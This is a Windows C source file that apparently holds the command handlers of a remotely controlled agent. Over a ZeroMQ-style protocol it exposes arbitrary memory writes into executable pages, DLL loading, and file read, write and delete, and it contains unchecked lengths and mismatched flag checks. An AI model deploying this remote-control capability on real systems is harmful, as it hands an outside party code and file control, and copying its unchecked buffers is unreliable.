#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include "commands.h"
#include "structures.h"
#include "file.h"
#include "threads.h"
#include <stdio.h>

// generate a response packet
char *gen_response(int response, int *size, int additional) {
	char *ret = NULL;
	
	if ((ret = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(ZmqRet) + additional + 1)) == NULL)
		return NULL;

	ZmqRet *resp = (ZmqRet *)ret;
	if (size != NULL)
		*size = sizeof(ZmqRet) + additional;
	resp->response = response;
	resp->extra_len = additional;
	return ret;
}

char *cmd_exit(char *_ptr, int pkt_len, int *ret_size) {
	ExitProcess(0);
}


char *cmd_thread_new(char *_ptr, int pkt_len, int *ret_size) {
	char *ret = NULL;
	ThreadInfo *tptr = thread_new();

	if (tptr == NULL) {
		ret = gen_response(0,ret_size,0);
	} else {
		ret = gen_response(1,ret_size,sizeof(int));
		CopyMemory((char *)(ret+sizeof(ZmqRet)), &tptr->thread_id, sizeof(int));
		LeaveCriticalSection(&tptr->CS);
	}

	return ret;
}

char *cmd_ping(void *thread, char *_ptr, int pkt_len, int *ret_size) {
	return gen_response(1, ret_size, 0);
}


char *cmd_thread_kill(char *_ptr, int pkt_len, int *ret_size) {
	int *id = (int *)_ptr;
	char *ret = NULL;

	ThreadInfo *tptr = thread_search(*id,0);
	if (tptr != NULL) {
		tptr->dead = 1;
		LeaveCriticalSection(&tptr->CS);
	}
	ret = gen_response(1,ret_size, 0);
	return ret;
}


// Microsoft C
void *getTIB() {
    void *pTIB;
    __asm {
        mov EAX, FS:[0x18]
			mov pTIB, EAX
    }
    return pTIB;
}


// this should start at MemTransfer (not ZmqPkt)
char *cmd_mem_transfer(void *tinfo, char *_ptr, int pkt_len, int *ret_size) {
	char *ptr = NULL;
	ZmqPkt *pkt = (ZmqPkt *)(_ptr);
	int success = 0;
	char *ret = NULL;
	MemTransfer *meminfo = (MemTransfer *)((char *)_ptr + sizeof(ZmqPkt));
	char fbuf[1024];

	if (pkt_len < (sizeof(ZmqPkt) + sizeof(MemTransfer))) return NULL;

	if (meminfo->cmd == MEM_PUSH) {
		wsprintf(fbuf, "MEM_PUSH %p len %d\r\n", meminfo->addr, meminfo->len);
		OutputDebugString(fbuf);
		// we will need to supoprt exceptions for this later!
		DWORD old_prot = 0;
		
		if (meminfo->_virtual) {
			
			char *tib = (char *)getTIB();
			CopyMemory((void *)((char *)tib + (int)meminfo->addr),(char *)(_ptr + sizeof(ZmqPkt) +  sizeof(MemTransfer)), meminfo->len);
		} else {
			try {
			VirtualProtect(meminfo->addr, meminfo->len, PAGE_EXECUTE_READWRITE, &old_prot);
			CopyMemory((void *)meminfo->addr, (char *)(_ptr + sizeof(ZmqPkt) +  sizeof(MemTransfer)), meminfo->len);
			VirtualProtect(meminfo->addr, meminfo->len,old_prot, &old_prot);
			} catch (DWORD err) {
			}
		}
		ret = gen_response(1, ret_size, 0);
	} else if (meminfo->cmd == MEM_PEEK) {
			ret = gen_response(1,ret_size, meminfo->len);
			if (ret != NULL) {
				// virtual means we wanna copy from TIB
				if (meminfo->_virtual) {
					char *tib = (char *)getTIB();
					CopyMemory((char *)(ret + sizeof(ZmqRet)), (void *)((char *)tib + (int)meminfo->addr), meminfo->len);
				} else
					CopyMemory((char *)(ret + sizeof(ZmqRet)), meminfo->addr, meminfo->len);
			}
	} else if (meminfo->cmd == MEM_ALLOC) {
		DWORD_PTR newptr = NULL;
		if (meminfo->addr == NULL && !meminfo->_virtual)
			newptr = (DWORD_PTR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, meminfo->len);
		else {
			newptr = (DWORD_PTR)VirtualAlloc(meminfo->addr, meminfo->len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		}
		
		DWORD last = GetLastError();
		if (newptr != NULL) {
			ZeroMemory((void *)newptr, meminfo->len);
			ret = gen_response(1,ret_size, sizeof(DWORD_PTR));
			if (ret != NULL)
				CopyMemory((char *)(ret + sizeof(ZmqRet)), &newptr, sizeof(DWORD_PTR));
		} else {
			success = 0;
			ret = gen_response(0, ret_size, 0);
		}
	} else if (meminfo->cmd == MEM_DEALLOC) {
		//ZeroMemory(meminfo->addr, meminfo->len);
		try {
		if (!meminfo->_virtual)
			HeapFree(GetProcessHeap(), 0, meminfo->addr);
		else
			VirtualFree(meminfo->addr, 0, MEM_RELEASE);
		} catch (DWORD err) {
			OutputDebugString("ERROR\n");
		}

		ret = gen_response(1, ret_size, 0);
		
	} else if (meminfo->cmd == MEM_ZERO) {
		ZeroMemory(meminfo->addr, meminfo->len);

		ret = gen_response(1,ret_size, 0);
	}

	return ret;
}


char *cmd_dll(char *ptr, int pkt_len, int *ret_size) {
	char *ret = NULL;
	char *name = (char *)(ptr + 1);
	if (ptr[0] == LOAD_DLL) {
		HMODULE loadret = LoadLibrary(name);
		ret = gen_response(1,ret_size, sizeof(DWORD_PTR));
		if (ret != NULL)
			CopyMemory((char *)(ret + sizeof(ZmqRet)), &loadret, sizeof(DWORD_PTR));
	} else if (ptr[1] == UNLOAD_DLL) {	
		ret = gen_response(1,ret_size, 0);
	} else if (ptr[1] == GET_DLL_HANDLE) {
		DWORD_PTR addr = (DWORD_PTR)GetModuleHandle(name);
		if (addr != NULL) {
			ret = gen_response(1,ret_size, sizeof(DWORD_PTR));
			if (ret != NULL)
				CopyMemory((char *)(ret + sizeof(ZmqRet)), &addr, sizeof(DWORD_PTR));
		} else {
			ret = gen_response(0, ret_size, 0);
		}
	} else if (ptr[1] == GET_MODULE_FILENAME) {
		char buf[MAX_PATH];
		int nlen = GetModuleFileName(GetModuleHandle(name), buf, MAX_PATH);
		ret = gen_response(1, ret_size, nlen + 1);
		CopyMemory((char *)(ret + sizeof(ZmqRet)), buf, nlen);
	}

	return ret;
}


char *file_cmd(void *tinfo, char *_ptr, int pkt_len, int *ret_size) {
	char *ptr = (char *)(_ptr + sizeof(ZmqPkt));
	char *ret = NULL;
	char *filename = NULL;
	char *data = NULL;
	int data_len = 0;
	char *name = NULL;
	FileInfo *finfo = (FileInfo *)(ptr);
	
	printf("file cmd\n");

	ptr += sizeof(FileInfo);

	if (pkt_len < sizeof(FileInfo)) {
		printf("ret from file cmd\n");
		return gen_response(0,ret_size,0);
	}

	
	//if (pkt_len < (int)(sizeof(FileInfo) + finfo->data_len + finfo->name_len))
	//	return gen_response(0,ret_size,0);

	//ptr += sizeof(ZmqPkt);
	//ptr += sizeof(FileInfo);
	
	if (finfo->name_len) {
		if ((name = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, finfo->name_len + 2)) == NULL)
			return gen_response(0,ret_size,0);
		
		CopyMemory(name, ptr, finfo->name_len);
		ptr += finfo->name_len;
	} 

	if (finfo->data_len) {
		if ((data = (char *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, finfo->data_len + 1)) == NULL)
			return gen_response(0, ret_size, 0);
		
		CopyMemory(data, ptr, finfo->data_len);
		ptr += finfo->data_len;
	}
	

	if (finfo->cmd == FILE_READ) {
		unsigned long size = 0;
		char *rdata = NULL;
		rdata = FileGetContents(name, &size);
		
		if (rdata == NULL && !size) {
			ret = gen_response(0,ret_size, 0);
		} else {
			ret = gen_response(1,ret_size, size);
			
			if (ret != NULL)
				CopyMemory((char *)(ret + sizeof(ZmqRet)),rdata,size);

			HeapFree(GetProcessHeap(), 0, rdata);
		}
	} else if (finfo->cmd == FILE_WRITE) {
		if (finfo->overwrite)
			DeleteFile(name);
		
		if (FilePutContents(name, data, data_len, 0) == 1)
			ret = gen_response(1,ret_size,0);

	} else if (finfo->cmd == FILE_DELETE) {
		DeleteFile(name);
		ret = gen_response(1,ret_size,0);

	}

	if (name != NULL) HeapFree(GetProcessHeap(), 0, name);
	if (data != NULL) HeapFree(GetProcessHeap(), 0, data);

	printf("ret from file cmd\n");
	return ret;

}
